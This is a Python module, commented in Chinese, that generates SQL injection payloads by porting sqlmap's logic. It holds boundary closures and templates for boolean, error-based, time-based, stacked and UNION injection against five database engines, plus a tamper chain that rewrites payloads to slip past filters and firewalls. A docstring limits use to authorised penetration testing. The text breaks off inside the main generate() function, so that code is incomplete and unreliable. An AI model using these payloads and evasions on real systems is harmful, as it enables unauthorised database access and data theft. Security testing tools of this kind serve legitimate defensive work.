# -*- coding: utf-8 -*-
"""SQL 注入 Payload 生成器（移植 sqlmap 的 payload 生成逻辑）。

生成模型与 sqlmap 一致（``data/xml/boundaries.xml`` × ``data/xml/payloads/*.xml``）::

    最终参数值 = 原值前缀 + boundary.prefix + test.payload + comment + boundary.suffix

- **boundary** 负责闭合原始语句上下文：数字型直拼 / 单双引号 / 括号 / 注释截断；
- **test** 是各注入技术（布尔盲注 / 报错 / 时间盲注 / UNION / 堆叠）的 payload
  模板，携带 sqlmap 的 ``level``（出现概率层级 1-5）/ ``risk``（破坏风险 1-3）/
  ``where``（1 拼原值、2 负数基值、3 整参替换）语义；
- **占位符替换**参考 sqlmap ``lib/core/agent.py`` 的 ``cleanupPayload``：
  ``[RANDNUM*] [RANDSTR*] [DELIMITER_START] [DELIMITER_STOP] [SLEEPTIME]
  [ORIGVALUE] [ORIGINAL] [QUERY] [INFERENCE] [GENERIC_SQL_COMMENT]
  [SPACE_REPLACE] [DOLLAR_REPLACE] [AT_REPLACE] [HASH_REPLACE]``；
- **tamper 链**参考 sqlmap ``tamper/`` 目录脚本，按
  「结构替换 → 大小写 / 空白 → 编码」的固定顺序应用；
- 同一条 test 的 payload 与对照（comparison）共享同一批随机替换值，
  保证 true/false 对照对只有条件本身不同（sqlmap 布尔盲注的判定基础）。

仅限授权靶场 / 渗透测试环境使用，请勿用于未授权目标。

本模块只做「配置进、结构化结果出」的纯计算，不导入 UI 模块、不发网络请求。
"""

from __future__ import annotations

import random
import re
from dataclasses import dataclass, field
from urllib.parse import quote as _urlquote

# ---------------------------------------------------------------------------
# 一、常量：技术 / DBMS / 拼接模式 / 默认值
# ---------------------------------------------------------------------------
TECH_BOOLEAN = "boolean"    # 布尔盲注（stype 1）
TECH_ERROR = "error"        # 报错注入（stype 2）
TECH_TIME = "time"          # 时间盲注（stype 5）
TECH_UNION = "union"        # UNION 查询（stype 6）
TECH_STACKED = "stacked"    # 堆叠查询（stype 4）

TECHNIQUES: tuple[tuple[str, str], ...] = (
    (TECH_BOOLEAN, "布尔盲注"),
    (TECH_ERROR, "报错注入"),
    (TECH_TIME, "时间盲注"),
    (TECH_UNION, "UNION 查询"),
    (TECH_STACKED, "堆叠查询"),
)
TECH_LABELS: dict[str, str] = dict(TECHNIQUES)

DBMS_ANY = ""                       # 不限数据库
DBMS_MYSQL = "MySQL"
DBMS_POSTGRESQL = "PostgreSQL"
DBMS_MSSQL = "Microsoft SQL Server"
DBMS_ORACLE = "Oracle"
DBMS_SQLITE = "SQLite"

#: 界面下拉用：值 + 显示名
DBMS_CHOICES: tuple[tuple[str, str], ...] = (
    (DBMS_ANY, "全部数据库"),
    (DBMS_MYSQL, "MySQL"),
    (DBMS_POSTGRESQL, "PostgreSQL"),
    (DBMS_MSSQL, "Microsoft SQL Server"),
    (DBMS_ORACLE, "Oracle"),
    (DBMS_SQLITE, "SQLite"),
)

#: 各库行注释（sqlmap queries.xml 的 <comment>；MySQL 习惯 #，其余 --）
DBMS_COMMENTS: dict[str, str] = {
    DBMS_MYSQL: "#",
    DBMS_POSTGRESQL: "--",
    DBMS_MSSQL: "--",
    DBMS_ORACLE: "--",
    DBMS_SQLITE: "--",
}

#: 通用注释占位符 [GENERIC_SQL_COMMENT] 的默认值（sqlmap 同名常量）
GENERIC_SQL_COMMENT = "-- "

#: 逐字符推断表达式（sqlmap queries.xml 的 <inference>，%s=查询 %d=位置 %d/%c=码位）
#: SQLite 用字符串比较形式（SUBSTR(...)>’@'），与 sqlmap 一致
INFERENCE_SQL: dict[str, str] = {
    DBMS_MYSQL: "ORD(MID(({q}),{p},1))>{c}",
    DBMS_POSTGRESQL: "ASCII(SUBSTRING(({q})::text FROM {p} FOR 1))>{c}",
    DBMS_MSSQL: "UNICODE(SUBSTRING(({q}),{p},1))>{c}",
    DBMS_ORACLE: "ASCII(SUBSTRC(({q}),{p},1))>{c}",
    DBMS_SQLITE: "SUBSTR(({q}),{p},1)>'@'",
}

WHERE_APPEND = "append"     # sqlmap where=1：拼接到原参数值之后
WHERE_NEGATIVE = "negative"  # sqlmap where=2：负数随机基值 + OR 变体
WHERE_REPLACE = "replace"   # sqlmap where=3：payload 整体替换原参数值

WHERE_CHOICES: tuple[tuple[str, str], ...] = (
    (WHERE_APPEND, "拼接到原值后（where=1）"),
    (WHERE_NEGATIVE, "负数基值 OR 变体（where=2）"),
    (WHERE_REPLACE, "整参替换（where=3）"),
)

#: UNION 填充模式
UNION_FILL_NULL = "NULL"      # 各列填 NULL（最通用）
UNION_FILL_NUMBER = "number"  # 各列填随机数字
UNION_FILL_CHAR = "char"      # 各列填随机字母
UNION_FILL_CHOICES: tuple[tuple[str, str], ...] = (
    (UNION_FILL_NULL, "NULL"),
    (UNION_FILL_NUMBER, "随机数字"),
    (UNION_FILL_CHAR, "随机字母"),
)

#: 向量中 [QUERY] 的默认替换内容
DEFAULT_QUERY = "SELECT @@version"

#: 默认时间盲注延时（秒）
DEFAULT_SLEEP = 5

#: 生成条数默认上限
DEFAULT_LIMIT = 300

# ---------------------------------------------------------------------------
# 二、boundary：闭合原始上下文的 prefix / suffix（移植 boundaries.xml 精选）
# ---------------------------------------------------------------------------
CLOSURE_AUTO = ""  # 不限闭合类型，全部边界都试


@dataclass(frozen=True)
class Boundary:
    """一个闭合边界（sqlmap <boundary> 的等价物，弱化 clause 匹配）。

    key     界面选择的闭合类型键
    label   显示名
    prefix  拼在 payload 之前：闭合引号 / 补括号
    suffix  拼在 payload 之后（无 comment 时）：补齐另一半闭合，使语句平衡
    """

    key: str
    label: str
    prefix: str
    suffix: str


CLOSURES: tuple[Boundary, ...] = (
    Boundary("num", "数字型（直拼）", "", "[GENERIC_SQL_COMMENT]"),
    Boundary("num_paren1", "数字型 + 单括号", ")", " AND ([RANDNUM]=[RANDNUM]"),
    Boundary("num_paren2", "数字型 + 双括号", "))", " AND (([RANDNUM]=[RANDNUM]"),
    Boundary("num_paren3", "数字型 + 三括号", ")))", " AND ((([RANDNUM]=[RANDNUM]"),
    Boundary("sq", "单引号", "'", " AND '[RANDSTR]'='[RANDSTR]"),
    Boundary("sq_paren1", "单引号 + 括号", "')", " AND ('[RANDSTR]'='[RANDSTR]"),
    Boundary("sq_paren2", "单引号 + 双括号", "'))", " AND (('[RANDSTR]'='[RANDSTR]"),
    Boundary("dq", "双引号", '"', ' AND "[RANDSTR]"="[RANDSTR]'),
    Boundary("dq_paren1", "双引号 + 括号", '")', ' AND ("[RANDSTR]"="[RANDSTR]'),
    Boundary("sq_or", "单引号（OR 平衡）", "'", " OR '[RANDSTR1]'='[RANDSTR2]"),
)

CLOSURE_CHOICES: tuple[tuple[str, str], ...] = (
    (CLOSURE_AUTO, "全部边界"),
) + tuple((b.key, b.label) for b in CLOSURES)

# ---------------------------------------------------------------------------
# 三、test：各技术 payload 模板（移植 payloads/*.xml 代表性条目）
# ---------------------------------------------------------------------------
#: 占位符扫描用的正则：[RANDNUM] / [RANDNUM1] / [DELIMITER_START] …
_PLACEHOLDER_RE = re.compile(r"\[[A-Z][A-Z0-9_]*\]")


@dataclass(frozen=True)
class TestSpec:
    """一条 sqlmap 风格的注入 test。

    technique  技术 key（TECH_*）
    title      sqlmap 风格标题
    dbms       适用数据库（空串 = 通用）
    level      1-5，越高越少见（<100 … >1000 请求）
    risk       1-3，越高对数据完整性风险越大（OR / 修改型语句）
    wheres     允许的拼接模式（对应 sqlmap <where> 取值 1/2/3）
    payload    探测 payload（验证注入是否存在）
    vector     利用向量（[QUERY]/[INFERENCE] 形式，空则无独立向量）
    comment    行注释；空则按 DBMS 取默认
    comparison 布尔盲注的 false 对照 payload（与 payload 共享随机替换）
    note       输出时的补充说明
    """

    technique: str
    title: str
    dbms: str
    level: int
    risk: int
    wheres: tuple[str, ...]
    payload: str
    vector: str = ""
    comment: str = ""
    comparison: str = ""
    note: str = ""


_W12 = (WHERE_APPEND,)
_W2 = (WHERE_NEGATIVE,)
_W3 = (WHERE_REPLACE,)

TESTS: tuple[TestSpec, ...] = (
    # -- 布尔盲注（stype 1） ----------------------------------------------
    TestSpec(
        TECH_BOOLEAN, "AND boolean-based blind - WHERE or HAVING clause",
        DBMS_ANY, 1, 1, _W12,
        "AND [RANDNUM]=[RANDNUM]",
        vector="AND [INFERENCE]",
        comparison="AND [RANDNUM]=[RANDNUM1]",
        note="true/false 对照：响应一致且与对照不同即存在注入",
    ),
    TestSpec(
        TECH_BOOLEAN, "OR boolean-based blind - WHERE or HAVING clause",
        DBMS_ANY, 1, 3, _W2,
        "OR [RANDNUM]=[RANDNUM]",
        vector="OR [INFERENCE]",
        comparison="OR [RANDNUM]=[RANDNUM1]",
        note="OR 变体需要负数基值配合（risk=3）",
    ),
    TestSpec(
        TECH_BOOLEAN, "boolean-based blind - Parameter replace (整参替换)",
        DBMS_ANY, 1, 1, _W3,
        "(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/[RANDNUM] END))",
        vector="(SELECT (CASE WHEN ([INFERENCE]) THEN 1 ELSE 1/[RANDNUM] END))",
        comparison="(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN 1 ELSE 1/[RANDNUM] END))",
        note="整参替换形式；除零产生不同响应作 true/false 判定",
    ),
    # -- 报错注入（stype 2） ------------------------------------------------
    TestSpec(
        TECH_ERROR, "MySQL >= 5.1 AND error-based - EXTRACTVALUE",
        DBMS_MYSQL, 1, 1, _W12,
        "AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',"
        "(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))",
        vector="AND EXTRACTVALUE([RANDNUM],CONCAT('\\','[DELIMITER_START]',"
        "([QUERY]),'[DELIMITER_STOP]'))",
        note="报错回显取分隔符 [DELIMITER_START]/[DELIMITER_STOP] 之间内容",
    ),
    TestSpec(
        TECH_ERROR, "MySQL >= 5.1 AND error-based - UPDATEXML",
        DBMS_MYSQL, 1, 1, _W12,
        "AND UPDATEXML([RANDNUM],CONCAT('\\','[DELIMITER_START]',"
        "(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),1)",
        vector="AND UPDATEXML([RANDNUM],CONCAT('\\','[DELIMITER_START]',"
        "([QUERY]),'[DELIMITER_STOP]'),1)",
    ),
    TestSpec(
        TECH_ERROR, "MySQL >= 5.0 AND error-based - FLOOR",
        DBMS_MYSQL, 2, 1, _W12,
        "AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',"
        "(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',"
        "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        vector="AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),"
        "CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',"
        "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        note="依赖 PRIMARY KEY 冲突报错，兼容 MySQL 5.0",
    ),
    TestSpec(
        TECH_ERROR, "PostgreSQL AND error-based - CAST AS NUMERIC",
        DBMS_POSTGRESQL, 1, 1, _W12,
        "AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN "
        "([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||"
        "'[DELIMITER_STOP]' AS NUMERIC)",
        vector="AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||"
        "'[DELIMITER_STOP]' AS NUMERIC)",
    ),
    TestSpec(
        TECH_ERROR, "MSSQL/Sybase AND error-based - IN (类型转换)",
        DBMS_MSSQL, 1, 1, _W12,
        "AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN "
        "([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))",
        vector="AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+"
        "([QUERY])+'[DELIMITER_STOP]'))",
    ),
    TestSpec(
        TECH_ERROR, "Oracle AND error-based - XMLType",
        DBMS_ORACLE, 1, 1, _W12,
        "AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||"
        "'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) "
        "THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) "
        "FROM DUAL)",
        vector="AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||"
        "'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),"
        "' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),"
        "'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||"
        "CHR(62))) FROM DUAL)",
        note="XMLType 报错；查询中的空格/$/@/# 需先替换为低频占位符",
    ),
    # -- 时间盲注（stype 5） --------------------------------------------------
    TestSpec(
        TECH_TIME, "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
        DBMS_MYSQL, 1, 1, _W12,
        "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])",
        vector="AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-"
        "(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
        note="query SLEEP 形式可避免 JOIN 场景多次触发延时",
    ),
    TestSpec(
        TECH_TIME, "MySQL >= 5.0.12 AND time-based blind (SLEEP)",
        DBMS_MYSQL, 2, 1, _W12,
        "AND SLEEP([SLEEPTIME])",
        vector="AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])",
    ),
    TestSpec(
        TECH_TIME, "PostgreSQL > 8.1 AND time-based blind (PG_SLEEP)",
        DBMS_POSTGRESQL, 1, 1, _W12,
        "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
        vector="AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN "
        "(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)",
    ),
    TestSpec(
        TECH_TIME, "MSSQL/Sybase time-based blind (WAITFOR DELAY)",
        DBMS_MSSQL, 1, 1, _W12,
        "WAITFOR DELAY '0:0:[SLEEPTIME]'",
        vector="IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
    ),
    TestSpec(
        TECH_TIME, "Oracle AND time-based blind (DBMS_PIPE)",
        DBMS_ORACLE, 1, 1, _W12,
        "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])",
        vector="AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN "
        "DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) "
        "ELSE [RANDNUM] END)",
    ),
    TestSpec(
        TECH_TIME, "SQLite > 2.0 AND time-based blind (heavy query)",
        DBMS_SQLITE, 2, 1, _W12,
        "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB("
        "[SLEEPTIME]00000000/2))))",
        vector="AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN "
        "(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) "
        "ELSE [RANDNUM] END)",
        note="SQLite 无 Sleep，用 RANDOMBLOB 重查询制造延时",
    ),
    # -- 堆叠查询（stype 4） --------------------------------------------------
    TestSpec(
        TECH_STACKED, "MySQL >= 5.0.12 stacked queries (comment)",
        DBMS_MYSQL, 2, 1, _W12,
        ";SELECT SLEEP([SLEEPTIME])",
        vector=";SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])",
        comment="#",
        note="需要驱动 / 中间件支持多语句执行",
    ),
    TestSpec(
        TECH_STACKED, "PostgreSQL > 8.1 stacked queries (comment)",
        DBMS_POSTGRESQL, 1, 1, _W12,
        ";SELECT PG_SLEEP([SLEEPTIME])",
        vector=";SELECT (CASE WHEN ([INFERENCE]) THEN "
        "(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)",
        comment="--",
    ),
    TestSpec(
        TECH_STACKED, "MSSQL/Sybase stacked queries (comment)",
        DBMS_MSSQL, 1, 1, _W12,
        ";WAITFOR DELAY '0:0:[SLEEPTIME]'",
        vector=";IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'",
        comment="--",
    ),
    TestSpec(
        TECH_STACKED, "Oracle stacked queries (DBMS_PIPE - comment)",
        DBMS_ORACLE, 1, 1, _W12,
        ";SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL",
        vector=";SELECT CASE WHEN ([INFERENCE]) THEN "
        "DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) "
        "ELSE [RANDNUM] END FROM DUAL",
        comment="--",
    ),
    TestSpec(
        TECH_STACKED, "SQLite > 2.0 stacked queries (heavy query - comment)",
        DBMS_SQLITE, 3, 2, _W12,
        ";SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))",
        vector=";SELECT (CASE WHEN ([INFERENCE]) THEN "
        "(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) "
        "ELSE [RANDNUM] END)",
        comment="--",
    ),
)

# ---------------------------------------------------------------------------
# 四、tamper：绕过变换链（移植 tamper/ 代表脚本，固定顺序应用）
# ---------------------------------------------------------------------------
_LOW_FREQ_ALPHABET = "zqxjkvbwg"  # sqlmap KB_CHARS_LOW_FREQUENCY_ALPHABET 思路


def _split_outside_quotes(text: str) -> list[tuple[str, bool]]:
    """把 text 切成 (片段, 是否在引号内) 序列，单双引号各自配对。"""
    parts: list[tuple[str, bool]] = []
    buf: list[str] = []
    quote = ""
    in_quote = False
    for ch in text:
        if not in_quote:
            if ch in "'\"":
                parts.append(("".join(buf), False))
                buf = [ch]
                quote, in_quote = ch, True
            else:
                buf.append(ch)
        else:
            buf.append(ch)
            if ch == quote:
                parts.append(("".join(buf), True))
                buf = []
                quote, in_quote = "", False
    parts.append(("".join(buf), in_quote))
    return parts


def _map_outside_quotes(text: str, fn) -> str:
    """对引号外的片段应用 ``fn``，引号内（含引号本身）原样保留。"""
    return "".join(seg if quoted else fn(seg)
                   for seg, quoted in _split_outside_quotes(text))


def _tamper_equaltolike(payload: str) -> str:
    """'=' → ' LIKE '（equaltolike.py）。"""
    return _map_outside_quotes(
        payload, lambda s: re.sub(r"\s*=\s*", " LIKE ", s))


def _tamper_between(payload: str) -> str:
    """'>' → 'NOT BETWEEN 0 AND'、'A=B' → 'A BETWEEN B AND B'（between.py）。"""
    def fn(seg: str) -> str:
        seg = re.sub(r"\b(\w+)\s*>\s*(\w+)", r"\1 NOT BETWEEN 0 AND \2", seg)
        seg = re.sub(r"\b(\w+)\s*=\s*(\w+)", r"\1 BETWEEN \2 AND \2", seg)
        return seg
    return _map_outside_quotes(payload, fn)


def _tamper_symboliclogical(payload: str) -> str:
    """AND / OR → '&&' / '||'（symboliclogical.py）。"""
    return _map_outside_quotes(
        payload, lambda s: re.sub(r"\b(AND|OR)\b",
                                  lambda m: "&&" if m.group(1) == "AND" else "||",
                                  s, flags=re.IGNORECASE))


def _tamper_randomcase(payload: str, rng: random.Random) -> str:
    """引号外字母随机大小写（randomcase.py）。"""
    def fn(seg: str) -> str:
        return "".join(ch.upper() if rng.random() < 0.5 else ch.lower()
                       for ch in seg)
    return _map_outside_quotes(payload, fn)


def _tamper_space2comment(payload: str) -> str:
    """空格 → '/**/'（space2comment.py）。"""
    return _map_outside_quotes(payload, lambda s: s.replace(" ", "/**/"))


def _tamper_space2randomblank(payload: str, rng: random.Random) -> str:
    """空格 → 随机空白符 \\t \\n \\r \\x0c（space2randomblank.py）。"""
    blanks = ("\t", "\n", "\r", "\x0c")
    return _map_outside_quotes(
        payload, lambda s: s.replace(" ", rng.choice(blanks)))


def _tamper_space2plus(payload: str) -> str:
    """空格 → '+'（space2plus.py）。"""
    return payload.replace(" ", "+")


def _tamper_apostrophemask(payload: str) -> str:
    """单引号 → URL 编码的全角引号 %EF%BC%87（apostrophemask.py）。"""
    return payload.replace("'", "%EF%BC%87")


def _tamper_percentage(payload: str) -> str:
    """每个字符前插 '%'（percentage.py，ASP/IIS 场景）。"""
    return "".join(
        ch if ch == "%" else "%" + ch for ch in payload)


def _tamper_charencode(payload: str) -> str:
    """全字符 URL 编码（charencode.py，%XX 大写）。"""
    encoded = _urlquote(payload, safe="")
    return re.sub(r"%[0-9a-f]{2}", lambda m: m.group(0).upper(), encoded)


@dataclass(frozen=True)
class TamperSpec:
    """一个 tamper 变换：key + 中文说明 + 实现函数。

    expects_rng 为 True 的实现签名为 ``fn(payload, rng)``（需要随机源），
    其余为 ``fn(payload)``。
    """

    key: str
    desc: str
    fn: object
    expects_rng: bool = False


#: 应用顺序 = 元组顺序（结构替换 → 大小写 / 空白 → 编码），勾选多个时链式生效
TAMPERS: tuple[TamperSpec, ...] = (
    TamperSpec("equaltolike", "'=' → LIKE", _tamper_equaltolike),
    TamperSpec("between", "'>'/'=' → NOT BETWEEN/BETWEEN", _tamper_between),
    TamperSpec("symboliclogical", "AND/OR → &&/||", _tamper_symboliclogical),
    TamperSpec("randomcase", "关键字随机大小写", _tamper_randomcase, True),
    TamperSpec("space2comment", "空格 → /**/", _tamper_space2comment),
    TamperSpec("space2randomblank", "空格 → 随机空白符",
               _tamper_space2randomblank, True),
    TamperSpec("space2plus", "空格 → +", _tamper_space2plus),
    TamperSpec("apostrophemask", "引号 → %EF%BC%87", _tamper_apostrophemask),
    TamperSpec("percentage", "字符前插 %（ASP）", _tamper_percentage),
    TamperSpec("charencode", "全字符 URL 编码", _tamper_charencode),
)

TAMPER_BY_KEY: dict[str, TamperSpec] = {t.key: t for t in TAMPERS}


def apply_tampers(payload: str, keys, rng: random.Random) -> str:
    """按 :data:`TAMPERS` 的固定顺序应用勾选的 tamper 链。"""
    chosen = {k for k in keys if k in TAMPER_BY_KEY}
    for tamper in TAMPERS:
        if tamper.key in chosen:
            if tamper.expects_rng:
                payload = tamper.fn(payload, rng)  # type: ignore[misc]
            else:
                payload = tamper.fn(payload)  # type: ignore[misc]
    return payload


# ---------------------------------------------------------------------------
# 五、占位符替换（移植 agent.cleanupPayload）与拼接（prefixQuery/suffixQuery）
# ---------------------------------------------------------------------------
def _wrap_token(rng: random.Random, length: int = 3) -> str:
    """低频字母夹在 q 之间的分隔 token（sqlmap kb.chars 的 qXq 形式）。"""
    inner = "".join(rng.choice(_LOW_FREQ_ALPHABET) for _ in range(length))
    return f"q{inner}q"


def _wrap_single(rng: random.Random) -> str:
    """单字符夹层 token（[SPACE_REPLACE] 等用，sqlmap 的 qXq 单字符形式）。"""
    return f"q{rng.choice(_LOW_FREQ_ALPHABET)}q"


def build_substitutions(texts, *, orig_value: str, sleep_time: int,
                        query: str, dbms: str,
                        rng: random.Random) -> dict[str, str]:
    """为一批文本（payload / 对照 / 向量）预生成共享的占位符替换表。

    同一批内同名占位符得到同一个值——布尔盲注的 true/false 对照对
    只有条件不同，其余（随机数 / 分隔符）完全一致。
    """
    joined = "\n".join(texts)
    effective_dbms = dbms or DBMS_MYSQL  # 通用模板默认按 MySQL 推断
    subs: dict[str, str] = {
        "[GENERIC_SQL_COMMENT]": DBMS_COMMENTS.get(effective_dbms, "#"),
        "[SLEEPTIME]": str(sleep_time),
        "[QUERY]": query,
        "[ORIGVALUE]": orig_value if orig_value.isdigit()
        else "'%s'" % orig_value,
        "[ORIGINAL]": orig_value,
        "[DELIMITER_START]": _wrap_token(rng),
        "[DELIMITER_STOP]": _wrap_token(rng),
        "[SPACE_REPLACE]": _wrap_single(rng),
        "[DOLLAR_REPLACE]": _wrap_single(rng),
        "[AT_REPLACE]": _wrap_single(rng),
        "[HASH_REPLACE]": _wrap_single(rng),
    }
    for match in sorted(set(_PLACEHOLDER_RE.findall(joined))):
        lowered = match.lower()
        if re.fullmatch(r"\[randnum\d*\]", lowered):
            subs[match] = str(rng.randrange(1000, 9999))
        elif re.fullmatch(r"\[randstr\d*\]", lowered):
            subs[match] = "".join(
                rng.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(6))
    # [INFERENCE]：按目标库的推断模板，取「第 1 位字符 > 64」作示例条件
    tmpl = INFERENCE_SQL.get(effective_dbms, INFERENCE_SQL[DBMS_MYSQL])
    subs["[INFERENCE]"] = tmpl.format(q=query, p=1, c=64)
    return subs


def cleanup_payload(text: str, subs: dict[str, str]) -> str:
    """把 ``subs`` 里出现的占位符替换进 text（未登记的占位符原样保留）。"""
    for key, value in subs.items():
        if key in text:
            text = text.replace(key, value)
    return text


def resolve_comment(test: TestSpec, dbms: str) -> str:
    """行注释：test 显式指定优先；未指定按库取默认（MySQL 的 -- 修正为 #）。"""
    effective = dbms or test.dbms or DBMS_MYSQL
    comment = test.comment or DBMS_COMMENTS.get(effective, "#")
    if effective == DBMS_MYSQL and comment.startswith("--"):
        comment = "#"
    return comment


def compose(boundary: Boundary, body: str, comment: str, where_mode: str,
            orig_value: str, rng: random.Random) -> str:
    """boundary × payload 拼接（移植 agent.prefixQuery / suffixQuery）。

    - prefix 与 payload 之间补空格（prefix 为空也补），但 payload 以
      ';' 开头（堆叠）或 prefix 以括号结尾且 payload 以括号开头时不补
      （sqlmap 同规则）；
    - 有 comment 时 comment 优先，suffix 被丢弃（sqlmap 同规则）；
    - WHERE_NEGATIVE 在最前面拼负数随机基值，WHERE_REPLACE 不拼原值。
    """
    prefix = boundary.prefix
    needs_space = not body.startswith(";") and not (
        prefix.endswith(("(", ")")) and body.startswith(("(", ")")))
    core = (prefix + " " if needs_space else prefix) + body
    if comment:
        core += comment
    elif boundary.suffix:
        if core and core[-1].isalnum() and boundary.suffix[:1].isalnum():
            core += " "
        core += boundary.suffix
    if where_mode == WHERE_NEGATIVE:
        head = "-%d" % rng.randrange(1000, 9999)
    elif where_mode == WHERE_REPLACE:
        head = ""
    else:
        head = orig_value
    return head + core


# ---------------------------------------------------------------------------
# 六、UNION payload 动态生成（移植 union_query.xml + forgeUnionQuery）
# ---------------------------------------------------------------------------
#: UNION 时需要 FROM 假表的库（sqlmap FROM_DUMMY_TABLE 精简）
UNION_DUMMY_TABLE: dict[str, str] = {DBMS_ORACLE: " FROM DUAL"}


def _union_fill_char(fill: str, rng: random.Random) -> str:
    if fill == UNION_FILL_NULL:
        return "NULL"
    if fill == UNION_FILL_NUMBER:
        return str(rng.randrange(1000, 9999))
    return rng.choice("abcdefghij")


def forge_union_body(n_cols: int, fill: str, dbms: str,
                     rng: random.Random) -> str:
    """生成 ``UNION ALL SELECT <fill>,<fill>,…`` 主体（含 Oracle 的 FROM DUAL）。"""
    cols = ",".join(_union_fill_char(fill, rng) for _ in range(n_cols))
    return "UNION ALL SELECT " + cols + UNION_DUMMY_TABLE.get(dbms, "")


# ---------------------------------------------------------------------------
# 七、结果结构与主入口
# ---------------------------------------------------------------------------
@dataclass(frozen=True)
class PayloadItem:
    """一条生成结果。

    technique / technique_label  技术 key 与中文标签
    title    sqlmap 风格标题
    dbms     适用数据库（空 = 通用）
    level / risk  sqlmap 语义
    closure / closure_label  使用的闭合边界
    payload  拼接 + 占位符替换 + tamper 后的最终参数值
    vector   利用向量（无则为空）
    note     补充说明（对照 payload / 预期延时 / 依赖条件）
    """

    technique: str
    title: str
    dbms: str
    level: int
    risk: int
    closure: str
    closure_label: str
    payload: str
    vector: str = ""
    note: str = ""
    technique_label: str = ""

    def __post_init__(self) -> None:
        if not self.technique_label:
            object.__setattr__(self, "technique_label",
                               TECH_LABELS.get(self.technique, self.technique))


@dataclass
class GenerateReport:
    """一次 generate() 的汇总：条目 + 各技术计数 + 生效的 tamper 链。"""

    items: list[PayloadItem] = field(default_factory=list)
    counts: dict[str, int] = field(default_factory=dict)
    tamper_keys: list[str] = field(default_factory=list)

    @property
    def total(self) -> int:
        return len(self.items)


def generate(
    *,
    techniques=None,
    dbms: str = DBMS_ANY,
    closure: str = CLOSURE_AUTO,
    where_mode: str = WHERE_APPEND,
    max_level: int = 3,
    orig_value: str = "1",
    sleep_time: int = DEFAULT_SLEEP,
    query: str = DEFAULT_QUERY,
    tampers=(),
    union_fill: str = UNION_FILL_NULL,
    union_col_start: int = 1,
    union_col_stop: int = 10,
    union_order_by: bool = True,
    limit: int = DEFAULT_LIMIT,
    seed: int | None = None,
) -> GenerateReport:
    """按配置生成 payload 列表。

    参数与界面一一对应：

    techniques        技术 key 集合，缺省全部五种
    dbms              目标库（空 = 全部；影响注释符 / 推断表达式）
    closure           闭合边界 key（空 = 全部边界）
    where_mode        拼接模式（append / negative / replace）
    max_level         level 上限（1-5，越小越常用）
    orig_value        原参数值（append 模式拼在 payload 前）
    sleep_time        [SLEEPTIME] 延时秒数
    query             向量中 [QUERY] 的替换内容
    tampers           tamper key 列表（按 TAMPERS 固定顺序链式应用）
    union_fill        UNION 各列填充（NULL / 随机数字 / 随机字母）
    union_col_start/stop  UNION 列数枚举范围
    union_order_by    是否生成 ORDER BY 列数探测 payload
    limit             生成条数上限（0 = 不限）
    seed              随机种子（测试 / 复现用）
    """
    selected = set(techniques) if techniques is not None else {
        key for key, _ in TECHNIQUES}
    rng = random.Random(seed)
    tamper_keys = [k for k in tampers if k in TAMPER_BY_KEY]
    orig_value = orig_value.strip() or "1"
    if union_col_start > union_col_stop:
        union_col_start, union_col_stop = union_col_stop, union_col_start

